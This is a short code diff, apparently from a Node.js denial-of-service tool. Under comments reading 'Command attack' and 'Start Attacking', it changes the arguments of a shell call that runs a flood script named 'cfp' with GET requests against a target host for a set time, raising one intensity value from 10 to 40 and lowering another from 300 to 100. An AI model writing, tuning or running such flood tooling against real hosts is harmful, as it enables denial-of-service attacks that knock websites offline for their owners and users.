@@ -72,7 +72,7 @@ if(!args[0]) {
 
 // Command attack
 var exec = require('child_process').exec
-exec(`node cfp ${host} 10 300 GET ${time}`, (error, stdout, stderr) => {
+exec(`node cfp ${host} 40 100 GET ${time}`, (error, stdout, stderr) => {
 });
 
 // Start Attacking
